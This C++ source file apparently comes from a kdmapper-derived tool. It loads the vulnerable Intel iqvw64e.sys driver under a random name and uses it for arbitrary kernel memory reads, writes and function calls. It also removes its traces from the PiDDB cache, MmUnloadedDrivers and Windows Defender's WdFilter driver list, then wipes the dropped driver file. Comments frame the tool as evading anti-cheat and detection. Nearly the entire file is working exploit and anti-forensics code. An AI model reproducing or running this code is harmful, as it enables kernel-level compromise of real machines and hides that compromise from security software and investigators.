// _ .--.   .--. / ) _ .--..--.
// [ '/'`\ \/ /'`\;[ `.-. .-. |       humbly winning,
//  | \__/ |\ \._// | | | | | |     one line at a time.
//  | ;.__/ .',__` [___||__||__]          [risku]
// [__ | ((__))

#include "../linker/stdafx.hpp"

ULONG64 intel_driver::ntoskrnlAddr = 0;
char intel_driver::driver_name[100] = {};
uintptr_t PiDDBLockPtr;
uintptr_t PiDDBCacheTablePtr;

std::wstring intel_driver::GetDriverNameW( ) {
	std::string t( intel_driver::driver_name );
	std::wstring name( t.begin( ), t.end( ) );
	return name;
}

std::wstring intel_driver::GetDriverPath( ) {
	std::wstring temp = utils::GetFullTempPath( );
	if ( temp.empty( ) ) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW( );
}

bool intel_driver::IsRunning( ) {
	const HANDLE file_handle = CreateFileW( L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
	if ( file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE )
	{
		CloseHandle( file_handle );
		return true;
	}
	return false;
}

HANDLE intel_driver::Load( ) {
	srand( ( unsigned )time( NULL ) * GetCurrentThreadId( ) );

	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
	if ( intel_driver::IsRunning( ) ) {
		no_iat( wprintf )( L"[-] \\Device\\Nal is already in use.\n" );
		return INVALID_HANDLE_VALUE;
	}

	//Randomize name for no_iat( wprintf ) in registry keys, usn jornal and other shits
	memset( intel_driver::driver_name, 0, sizeof( intel_driver::driver_name ) );
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand( ) % 20 + 10;
	for ( int i = 0; i < len; ++i )
		intel_driver::driver_name[i] = alphanum[rand( ) % ( sizeof( alphanum ) - 1 )];

	no_iat( wprintf )( L"[<] generating custom seed\n" );

	std::wstring driver_path = GetDriverPath( );
	if ( driver_path.empty( ) ) {
		no_iat( wprintf )( L"[-] Can't find TEMP folder\n" );
		return INVALID_HANDLE_VALUE;
	}

	_wremove( driver_path.c_str( ) );

	if ( !utils::CreateFileFromMemory( driver_path, reinterpret_cast< const char* >( driver_resource::driverBuffer ), sizeof( driver_resource::driverBuffer ) ) ) {
		no_iat( wprintf )( L"[-] Failed to create vulnerable driver file\n" );
		return INVALID_HANDLE_VALUE;
	}

	if ( !service::RegisterAndStart( driver_path ) ) {
		no_iat( wprintf )( L"[-] blocklist interference has occured. win11? reg edited?\n" );
		_wremove( driver_path.c_str( ) );
		return INVALID_HANDLE_VALUE;
	}

	HANDLE result = CreateFileW( L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );

	if ( !result || result == INVALID_HANDLE_VALUE )
	{
		no_iat( wprintf )( L"[-] Failed to load driver iqvw64e.sys\n" );
		intel_driver::Unload( result );
		return INVALID_HANDLE_VALUE;
	}

	ntoskrnlAddr = utils::GetKernelModuleAddress( "ntoskrnl.exe" );
	if ( ntoskrnlAddr == 0 ) {
		no_iat( wprintf )( L"[-] Failed to get ntoskrnl.exe\n" );
		intel_driver::Unload( result );
		return INVALID_HANDLE_VALUE;
	}

	if ( !intel_driver::ClearPiDDBCacheTable( result ) ) {
		no_iat( wprintf )( L"[-] Failed to ClearPiDDBCacheTable\n" );
		intel_driver::Unload( result );
		return INVALID_HANDLE_VALUE;
	}

	if ( !intel_driver::ClearKernelHashBucketList( result ) ) {
		no_iat( wprintf )( L"[-] Failed to ClearKernelHashBucketList\n" );
		intel_driver::Unload( result );
		return INVALID_HANDLE_VALUE;
	}

	if ( !intel_driver::ClearMmUnloadedDrivers( result ) ) {
		no_iat( wprintf )( L"[!] Failed to ClearMmUnloadedDrivers\n" );
		intel_driver::Unload( result );
		return INVALID_HANDLE_VALUE;
	}

	if ( !intel_driver::ClearWdFilterDriverList( result ) ) {
		no_iat( wprintf )( L"[!] Failed to ClearWdFilterDriverList\n" );
		intel_driver::Unload( result );
		return INVALID_HANDLE_VALUE;
	}

	return result;
}

bool intel_driver::ClearWdFilterDriverList( HANDLE device_handle ) {

	auto WdFilter = utils::GetKernelModuleAddress( "WdFilter.sys" );
	if ( !WdFilter ) {
		no_iat( wprintf )( L"[+] initialized!\n" );
		return true;
	}

	auto RuntimeDriversList = FindPatternInSectionAtKernel( device_handle, "PAGE", WdFilter, ( PUCHAR )"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx" );
	if ( !RuntimeDriversList ) {
		no_iat( wprintf )( L"[!] Failed to find WdFilter RuntimeDriversList\n" );
		return false;
	}

	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel( device_handle, "PAGE", WdFilter, ( PUCHAR )"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx" );
	if ( !RuntimeDriversCountRef ) {
		no_iat( wprintf )( L"[!] Failed to find WdFilter RuntimeDriversCount\n" );
		return false;
	}

	// MpCleanupDriverInfo->MpFreeDriverInfoEx 23110
	/*
		49 8B C9                      mov     rcx, r9         ; P
		49 89 50 08                   mov     [r8+8], rdx
		E8 FB F0 FD FF                call    MpFreeDriverInfoEx
		48 8B 0D FC AA FA FF          mov     rcx, cs:qword_1C0021BF0
		E9 21 FF FF FF                jmp     loc_1C007701A
	*/
	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel( device_handle, "PAGE", WdFilter, ( PUCHAR )"\x49\x8B\xC9\x00\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "xxx?x?xx???????????x" );
	if ( !MpFreeDriverInfoExRef ) {
		// 24010 
		/*
			48 89 4A 08                   mov     [rdx+8], rcx
			49 8B C8                      mov     rcx, r8         ; P
			E8 C3 58 FE FF                call    sub_1C0065308
			48 8B 0D 44 41 FA FF          mov     rcx, cs:qword_1C0023B90
			E9 39 FF FF FF                jmp     loc_1C007F98A
		*/
		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel( device_handle, "PAGE", WdFilter, ( PUCHAR )"\x48\x89\x4A\x00\x49\x8b\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "xxx?xx?x???????????x" );
		if ( !MpFreeDriverInfoExRef ) {
			no_iat( wprintf )( L"[!] Failed to find WdFilter MpFreeDriverInfoEx\n" );
			return false;
		}
		else {
			no_iat( wprintf )( L"[+] Found WdFilter MpFreeDriverInfoEx with second pattern\n" );
		}

	}

	MpFreeDriverInfoExRef += 0x7; // skip until call instruction

	RuntimeDriversList = ( uintptr_t )ResolveRelativeAddress( device_handle, ( PVOID )RuntimeDriversList, 3, 7 );
	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
	uintptr_t RuntimeDriversCount = ( uintptr_t )ResolveRelativeAddress( device_handle, ( PVOID )RuntimeDriversCountRef, 2, 6 );
	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	ReadMemory( device_handle, RuntimeDriversArray, &RuntimeDriversArray, sizeof( uintptr_t ) );
	uintptr_t MpFreeDriverInfoEx = ( uintptr_t )ResolveRelativeAddress( device_handle, ( PVOID )MpFreeDriverInfoExRef, 1, 5 );

	auto ReadListEntry = [&] ( uintptr_t Address ) -> LIST_ENTRY* { // Usefull lambda to read LIST_ENTRY
		LIST_ENTRY* Entry;
		if ( !ReadMemory( device_handle, Address, &Entry, sizeof( LIST_ENTRY* ) ) ) return 0;
		return Entry;
		};

	for ( LIST_ENTRY* Entry = ReadListEntry( RuntimeDriversList_Head );
		Entry != ( LIST_ENTRY* )RuntimeDriversList_Head;
		Entry = ReadListEntry( ( uintptr_t )Entry + ( offsetof( struct _LIST_ENTRY, Flink ) ) ) )
	{
		UNICODE_STRING Unicode_String;
		if ( ReadMemory( device_handle, ( uintptr_t )Entry + 0x10, &Unicode_String, sizeof( UNICODE_STRING ) ) ) {
			auto ImageName = std::make_unique<wchar_t[]>( ( ULONG64 )Unicode_String.Length / 2ULL + 1ULL );
			if ( ReadMemory( device_handle, ( uintptr_t )Unicode_String.Buffer, ImageName.get( ), Unicode_String.Length ) ) {
				if ( wcsstr( ImageName.get( ), intel_driver::GetDriverNameW( ).c_str( ) ) ) {

					//remove from RuntimeDriversArray
					bool removedRuntimeDriversArray = false;
					PVOID SameIndexList = ( PVOID )( ( uintptr_t )Entry - 0x10 );
					for ( int k = 0; k < 256; k++ ) { // max RuntimeDriversArray elements
						PVOID value = 0;
						ReadMemory( device_handle, RuntimeDriversArray + ( k * 8 ), &value, sizeof( PVOID ) );
						if ( value == SameIndexList ) {
							PVOID emptyval = ( PVOID )( RuntimeDriversCount + 1 ); // this is not count+1 is position of cout addr+1
							WriteMemory( device_handle, RuntimeDriversArray + ( k * 8 ), &emptyval, sizeof( PVOID ) );
							removedRuntimeDriversArray = true;
							break;
						}
					}

					if ( !removedRuntimeDriversArray ) {
						no_iat( wprintf )( L"[!] Failed to remove from RuntimeDriversArray\n" );
						return false;
					}

					auto NextEntry = ReadListEntry( uintptr_t( Entry ) + ( offsetof( struct _LIST_ENTRY, Flink ) ) );
					auto PrevEntry = ReadListEntry( uintptr_t( Entry ) + ( offsetof( struct _LIST_ENTRY, Blink ) ) );

					WriteMemory( device_handle, uintptr_t( NextEntry ) + ( offsetof( struct _LIST_ENTRY, Blink ) ), &PrevEntry, sizeof( LIST_ENTRY::Blink ) );
					WriteMemory( device_handle, uintptr_t( PrevEntry ) + ( offsetof( struct _LIST_ENTRY, Flink ) ), &NextEntry, sizeof( LIST_ENTRY::Flink ) );


					// decrement RuntimeDriversCount
					ULONG current = 0;
					ReadMemory( device_handle, RuntimeDriversCount, &current, sizeof( ULONG ) );
					current--;
					WriteMemory( device_handle, RuntimeDriversCount, &current, sizeof( ULONG ) );

					// call MpFreeDriverInfoEx
					uintptr_t DriverInfo = ( uintptr_t )Entry - 0x20;

					//verify DriverInfo Magic
					USHORT Magic = 0;
					ReadMemory( device_handle, DriverInfo, &Magic, sizeof( USHORT ) );
					if ( Magic != 0xDA18 ) {
						no_iat( wprintf )( L"[-] a super rare error has occured, 0.1% chance of this happening. open ticket: code #44 send this to support\n" );
					}
					else {
						CallKernelFunction<void>( device_handle, nullptr, MpFreeDriverInfoEx, DriverInfo );
					} 
					return true;
				}
			}
		}
	}
	return false;
}

bool intel_driver::Unload( HANDLE device_handle ) {
	no_iat( wprintf )( L"[+] making sure BE is not spying..\n" );

	if ( device_handle && device_handle != INVALID_HANDLE_VALUE ) {
		CloseHandle( device_handle );
	}

	if ( !service::StopAndRemove( GetDriverNameW( ) ) )
		return false;

	std::wstring driver_path = GetDriverPath( );

	//Destroy disk information before unlink from disk to prevent any recover of the file
	std::ofstream file_ofstream( driver_path.c_str( ), std::ios_base::out | std::ios_base::binary );
	int newFileLen = sizeof( driver_resource::driverBuffer ) + ( ( ( long long )rand( ) * ( long long )rand( ) ) % 2000000 + 1000 );
	BYTE* randomData = new BYTE[newFileLen];
	for ( size_t i = 0; i < newFileLen; i++ ) {
		randomData[i] = ( BYTE )( rand( ) % 255 );
	}
	no_iat( wprintf )( L"[+] dumping remaining data..\n" );
	if ( !file_ofstream.write( ( char* )randomData, newFileLen ) ) {
		no_iat( wprintf )( L"[+] err 3\n" );
	}
	else {
		no_iat( wprintf )( L"[+] trashed 444/444 bytes\n" );
	}
	file_ofstream.close( );
	delete[] randomData;

	//unlink the file
	if ( _wremove( driver_path.c_str( ) ) != 0 )
		return false;

	return true;
}

uint64_t intel_driver::IoGetCurrentProcess( HANDLE device_handle )
{
	static uint64_t kernel_IoGetCurrentProcess = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "IoGetCurrentProcess" );

	if ( !kernel_IoGetCurrentProcess )
	{
		printf( "Failed to find IoGetCurrentProcess\n" );
		return 0;
	}

	uint64_t output = 0;

	if ( !CallKernelFunction( device_handle, &output, kernel_IoGetCurrentProcess ) )
		return 0;

	return output;
}

uint64_t intel_driver::PsGetCurrentThread( HANDLE device_handle )
{
	static uint64_t kernel_PsGetCurrentThread = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "PsGetCurrentThread" );

	if ( !kernel_PsGetCurrentThread )
	{
		printf( "Failed to find PsGetCurrentThread\n" );
		return 0;
	}

	uint64_t output = 0;

	if ( !CallKernelFunction( device_handle, &output, kernel_PsGetCurrentThread ) )
		return 0;

	return output;
}
bool intel_driver::MemCopy( HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size ) {
	if ( !destination || !source || !size )
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl( device_handle, ioctl1, &copy_memory_buffer, sizeof( copy_memory_buffer ), nullptr, 0, &bytes_returned, nullptr );
}

bool intel_driver::SetMemory( HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size ) {
	if ( !address || !size )
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl( device_handle, ioctl1, &fill_memory_buffer, sizeof( fill_memory_buffer ), nullptr, 0, &bytes_returned, nullptr );
}

bool intel_driver::GetPhysicalAddress( HANDLE device_handle, uint64_t address, uint64_t* out_physical_address ) {
	if ( !address )
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if ( !DeviceIoControl( device_handle, ioctl1, &get_phys_address_buffer, sizeof( get_phys_address_buffer ), nullptr, 0, &bytes_returned, nullptr ) )
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t intel_driver::MapIoSpace( HANDLE device_handle, uint64_t physical_address, uint32_t size ) {
	if ( !physical_address || !size )
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if ( !DeviceIoControl( device_handle, ioctl1, &map_io_space_buffer, sizeof( map_io_space_buffer ), nullptr, 0, &bytes_returned, nullptr ) )
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool intel_driver::UnmapIoSpace( HANDLE device_handle, uint64_t address, uint32_t size ) {
	if ( !address || !size )
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl( device_handle, ioctl1, &unmap_io_space_buffer, sizeof( unmap_io_space_buffer ), nullptr, 0, &bytes_returned, nullptr );
}

bool intel_driver::ReadMemory( HANDLE device_handle, uint64_t address, void* buffer, uint64_t size ) {
	return MemCopy( device_handle, reinterpret_cast< uint64_t >( buffer ), address, size );
}

bool intel_driver::WriteMemory( HANDLE device_handle, uint64_t address, void* buffer, uint64_t size ) {
	return MemCopy( device_handle, address, reinterpret_cast< uint64_t >( buffer ), size );
}

bool intel_driver::WriteToReadOnlyMemory( HANDLE device_handle, uint64_t address, void* buffer, uint32_t size ) {
	if ( !address || !buffer || !size )
		return false;

	uint64_t physical_address = 0;

	if ( !GetPhysicalAddress( device_handle, address, &physical_address ) ) {
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace( device_handle, physical_address, size );

	if ( !mapped_physical_memory ) {
		return false;
	}

	bool result = WriteMemory( device_handle, mapped_physical_memory, buffer, size );

#if defined(DISABLE_OUTPUT)
	UnmapIoSpace( device_handle, mapped_physical_memory, size );
#else
	if ( !UnmapIoSpace( device_handle, mapped_physical_memory, size ) )
		return false;
#endif


	return result;
}

uint64_t intel_driver::MmAllocateIndependentPagesEx( HANDLE device_handle, uint32_t size )
{
	uint64_t allocated_pages{};

	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

	if ( !kernel_MmAllocateIndependentPagesEx )
	{
		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel( device_handle, ( char* )"PAGELK", intel_driver::ntoskrnlAddr,
			( BYTE* )"\xE8\x00\x00\x00\x00\x48\x8B\xF0\x48\x85\xC0\x0F\x84\x00\x00\x00\x00\x44\x8B\xC5\x33\xD2\x48\x8B\xC8\xE8\x00\x00\x00\x00\x48\x8D\x46\x3F\x48\x83\xE0\xC0",
			( char* )"x????xxxxxxxx????xxxxxxxxx????xxxxxxxx" );
		if ( !kernel_MmAllocateIndependentPagesEx ) {
			no_iat( wprintf )( L"[!] Failed to find MmAllocateIndependentPagesEx\n" );
			return 0;
		}

		kernel_MmAllocateIndependentPagesEx = ( uint64_t )ResolveRelativeAddress( device_handle, ( PVOID )kernel_MmAllocateIndependentPagesEx, 1, 5 );
		if ( !kernel_MmAllocateIndependentPagesEx ) {
			no_iat( wprintf )( L"[!] Failed to find MmAllocateIndependentPagesEx\n" );
			return 0;
		}
	}

	if ( !intel_driver::CallKernelFunction( device_handle, &allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0 ) )
		return 0;

	return allocated_pages;
}

bool intel_driver::MmFreeIndependentPages( HANDLE device_handle, uint64_t address, uint32_t size )
{
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if ( !kernel_MmFreeIndependentPages )
	{
		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel( device_handle, "PAGE", intel_driver::ntoskrnlAddr,
			( BYTE* )"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
			( char* )"xxxxxxxxx????xxxxxxx" );
		if ( !kernel_MmFreeIndependentPages ) {
			no_iat( wprintf )( L"[!] Failed to find MmFreeIndependentPages\n" );
			return false;
		}

		kernel_MmFreeIndependentPages += 8;

		kernel_MmFreeIndependentPages = ( uint64_t )ResolveRelativeAddress( device_handle, ( PVOID )kernel_MmFreeIndependentPages, 1, 5 );
		if ( !kernel_MmFreeIndependentPages ) {
			no_iat( wprintf )( L"[!] Failed to find MmFreeIndependentPages\n" );
			return false;
		}
	}

	uint64_t result{};
	return intel_driver::CallKernelFunction( device_handle, &result, kernel_MmFreeIndependentPages, address, size );
}

BOOLEAN intel_driver::MmSetPageProtection( HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect )
{
	if ( !address )
	{
		no_iat( wprintf )( L"[!] Invalid address passed to MmSetPageProtection\n" );
		return FALSE;
	}

	static uint64_t kernel_MmSetPageProtection = 0;

	if ( !kernel_MmSetPageProtection )
	{
		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel( device_handle, "PAGE", intel_driver::ntoskrnlAddr,
			( BYTE* )"\x41\xB8\x00\x00\x00\x00\x48\x00\x00\x00\x8B\x00\xE8\x00\x00\x00\x00\x84\xC0\x74\x09\x48\x81\xEB\x00\x00\x00\x00\xEB",
			( char* )"xx????x???x?x????xxxxxxx????x" );
		if ( !kernel_MmSetPageProtection ) {
			no_iat( wprintf )( L"[!] Failed to find MmSetPageProtection\n" );
			return FALSE;
		}

		kernel_MmSetPageProtection += 12;

		kernel_MmSetPageProtection = ( uint64_t )ResolveRelativeAddress( device_handle, ( PVOID )kernel_MmSetPageProtection, 1, 5 );
		if ( !kernel_MmSetPageProtection ) {
			no_iat( wprintf )( L"[!] Failed to find MmSetPageProtection\n" );
			return FALSE;
		}
	}

	BOOLEAN set_prot_status{};
	if ( !intel_driver::CallKernelFunction( device_handle, &set_prot_status, kernel_MmSetPageProtection, address, size, new_protect ) )
		return FALSE;

	return set_prot_status;
}

/*added by psec*/
uint64_t intel_driver::MmAllocatePagesForMdl( HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes )
{
	static uint64_t kernel_MmAllocatePagesForMdl = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "MmAllocatePagesForMdl" );

	if ( !kernel_MmAllocatePagesForMdl )
	{
		no_iat( wprintf )( L"[!] Failed to find MmAlocatePagesForMdl\n" );
		return 0;
	}

	uint64_t allocated_pages = 0;

	if ( !CallKernelFunction( device_handle, &allocated_pages, kernel_MmAllocatePagesForMdl, LowAddress, HighAddress, SkipBytes, TotalBytes ) )
		return 0;

	return allocated_pages;
}

uint64_t intel_driver::MmMapLockedPagesSpecifyCache( HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority )
{
	static uint64_t kernel_MmMapLockedPagesSpecifyCache = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "MmMapLockedPagesSpecifyCache" );

	if ( !kernel_MmMapLockedPagesSpecifyCache )
	{
		no_iat( wprintf )( L"[!] Failed to find MmMapLockedPagesSpecifyCache\n" );
		return 0;
	}

	uint64_t starting_address = 0;

	if ( !CallKernelFunction( device_handle, &starting_address, kernel_MmMapLockedPagesSpecifyCache, pmdl, AccessMode, CacheType, RequestedAddress, BugCheckOnFailure, Priority ) )
		return 0;

	return starting_address;
}

bool intel_driver::MmProtectMdlSystemAddress( HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect )
{
	static uint64_t kernel_MmProtectMdlSystemAddress = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "MmProtectMdlSystemAddress" );

	if ( !kernel_MmProtectMdlSystemAddress )
	{
		no_iat( wprintf )( L"[!] Failed to find MmProtectMdlSystemAddress\n" );
		return 0;
	}

	NTSTATUS status;

	if ( !CallKernelFunction( device_handle, &status, kernel_MmProtectMdlSystemAddress, MemoryDescriptorList, NewProtect ) )
		return 0;

	return NT_SUCCESS( status );
}


bool intel_driver::MmUnmapLockedPages( HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl )
{
	static uint64_t kernel_MmUnmapLockedPages = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "MmUnmapLockedPages" );

	if ( !kernel_MmUnmapLockedPages )
	{
		no_iat( wprintf )( L"[!] Failed to find MmUnmapLockedPages\n" );
		return 0;
	}

	void* result;
	return CallKernelFunction( device_handle, &result, kernel_MmUnmapLockedPages, BaseAddress, pmdl );
}

bool intel_driver::MmFreePagesFromMdl( HANDLE device_handle, uint64_t MemoryDescriptorList )
{
	static uint64_t kernel_MmFreePagesFromMdl = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "MmFreePagesFromMdl" );

	if ( !kernel_MmFreePagesFromMdl )
	{
		no_iat( wprintf )( L"[!] Failed to find MmFreePagesFromMdl\n" );
		return 0;
	}

	void* result;
	return CallKernelFunction( device_handle, &result, kernel_MmFreePagesFromMdl, MemoryDescriptorList );
}
/**/

uint64_t intel_driver::AllocatePool( HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size ) {
	if ( !size )
		return 0;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag" );

	if ( !kernel_ExAllocatePool ) {
		no_iat( wprintf )( L"[!] Failed to find ExAllocatePool\n" );
		return 0;
	}

	uint64_t allocated_pool = 0;

	if ( !CallKernelFunction( device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE' ) ) //Changed pool tag since an extremely meme checking diff between allocation size and average for detection....
		return 0;

	return allocated_pool;
}

bool intel_driver::FreePool( HANDLE device_handle, uint64_t address ) {
	if ( !address )
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "ExFreePool" );

	if ( !kernel_ExFreePool ) {
		no_iat( wprintf )( L"[!] Failed to find ExAllocatePool\n" );
		return 0;
	}

	return CallKernelFunction<void>( device_handle, nullptr, kernel_ExFreePool, address );
}

uint64_t intel_driver::GetKernelModuleExport( HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name ) {
	if ( !kernel_module_base )
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if ( !ReadMemory( device_handle, kernel_module_base, &dos_header, sizeof( dos_header ) ) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory( device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof( nt_headers ) ) || nt_headers.Signature != IMAGE_NT_SIGNATURE )
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if ( !export_base || !export_base_size )
		return 0;

	const auto export_data = reinterpret_cast< PIMAGE_EXPORT_DIRECTORY >( VirtualAlloc( nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );

	if ( !ReadMemory( device_handle, kernel_module_base + export_base, export_data, export_base_size ) )
	{
		VirtualFree( export_data, 0, MEM_RELEASE );
		return 0;
	}

	const auto delta = reinterpret_cast< uint64_t >( export_data ) - export_base;

	const auto name_table = reinterpret_cast< uint32_t* >( export_data->AddressOfNames + delta );
	const auto ordinal_table = reinterpret_cast< uint16_t* >( export_data->AddressOfNameOrdinals + delta );
	const auto function_table = reinterpret_cast< uint32_t* >( export_data->AddressOfFunctions + delta );

	for ( auto i = 0u; i < export_data->NumberOfNames; ++i ) {
		const std::string current_function_name = std::string( reinterpret_cast< char* >( name_table[i] + delta ) );

		if ( !_stricmp( current_function_name.c_str( ), function_name.c_str( ) ) ) {
			const auto function_ordinal = ordinal_table[i];
			if ( function_table[function_ordinal] <= 0x1000 ) {
				// Wrong function address?
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if ( function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size ) {
				VirtualFree( export_data, 0, MEM_RELEASE );
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree( export_data, 0, MEM_RELEASE );
			return function_address;
		}
	}

	VirtualFree( export_data, 0, MEM_RELEASE );
	return 0;
}

bool intel_driver::ClearMmUnloadedDrivers( HANDLE device_handle ) {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation( static_cast< SYSTEM_INFORMATION_CLASS >( nt::SystemExtendedHandleInformation ), buffer, buffer_size, &buffer_size );

	while ( status == nt::STATUS_INFO_LENGTH_MISMATCH )
	{
		VirtualFree( buffer, 0, MEM_RELEASE );

		buffer = VirtualAlloc( nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
		status = NtQuerySystemInformation( static_cast< SYSTEM_INFORMATION_CLASS >( nt::SystemExtendedHandleInformation ), buffer, buffer_size, &buffer_size );
	}

	if ( !NT_SUCCESS( status ) || buffer == 0 )
	{
		if ( buffer != 0 )
			VirtualFree( buffer, 0, MEM_RELEASE );
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast< nt::PSYSTEM_HANDLE_INFORMATION_EX >( buffer );

	for ( auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i )
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if ( current_system_handle.UniqueProcessId != reinterpret_cast< HANDLE >( static_cast< uint64_t >( GetCurrentProcessId( ) ) ) )
			continue;

		if ( current_system_handle.HandleValue == device_handle )
		{
			object = reinterpret_cast< uint64_t >( current_system_handle.Object );
			break;
		}
	}

	VirtualFree( buffer, 0, MEM_RELEASE );

	if ( !object )
		return false;

	uint64_t device_object = 0;

	if ( !ReadMemory( device_handle, object + 0x8, &device_object, sizeof( device_object ) ) || !device_object ) {
		no_iat( wprintf )( L"[!] Failed to find device_object\n" );
		return false;
	}

	uint64_t driver_object = 0;

	if ( !ReadMemory( device_handle, device_object + 0x8, &driver_object, sizeof( driver_object ) ) || !driver_object ) {
		no_iat( wprintf )( L"[!] Failed to find driver_object\n" );
		return false;
	}

	uint64_t driver_section = 0;

	if ( !ReadMemory( device_handle, driver_object + 0x28, &driver_section, sizeof( driver_section ) ) || !driver_section ) {
		no_iat( wprintf )( L"[!] Failed to find driver_section\n" );
		return false;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if ( !ReadMemory( device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof( us_driver_base_dll_name ) ) || us_driver_base_dll_name.Length == 0 ) {
		no_iat( wprintf )( L"[!] Failed to find driver name\n" );
		return false;
	}

	auto unloadedName = std::make_unique<wchar_t[]>( ( ULONG64 )us_driver_base_dll_name.Length / 2ULL + 1ULL );
	if ( !ReadMemory( device_handle, ( uintptr_t )us_driver_base_dll_name.Buffer, unloadedName.get( ), us_driver_base_dll_name.Length ) ) {
		no_iat( wprintf )( L"[!] Failed to read driver name\n" );
		return false;
	}

	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver

	if ( !WriteMemory( device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof( us_driver_base_dll_name ) ) ) {
		no_iat( wprintf )( L"[!] Failed to write driver name length\n" );
		return false;
	}

	return true;
}

